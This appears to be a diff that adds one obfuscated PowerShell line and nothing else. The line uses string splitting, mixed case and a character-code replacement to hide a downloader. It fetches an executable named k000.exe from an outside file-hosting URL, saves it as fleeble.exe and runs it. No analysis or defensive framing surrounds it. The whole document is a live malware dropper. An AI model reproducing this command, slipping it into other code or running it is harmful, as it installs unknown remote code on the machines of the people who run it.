@@ -1,0 +1,1 @@
+﻿INVOkE-expReSsIoN( ('('+'N'+'ew-'+'Ob'+'j'+'ect S'+'yst'+'em'+'.N'+'e'+'t.WebClient).Dow'+'nloadFi'+'l'+'e('+'K'+'F'+'Ph'+'tt'+'p:'+'//ddl'+'2.da'+'ta.hu/get'+'/0/'+'9'+'5896'+'2'+'1/k0'+'00'+'.'+'e'+'xeK'+'FP,K'+'FPf'+'leeble.'+'ex'+'eKFP);Start-Process '+'KFPfleeble.exe'+'KFP').rEPLaCE(([cHaR]75+[cHaR]70+[cHaR]80),[sTrinG][cHaR]39) ) 
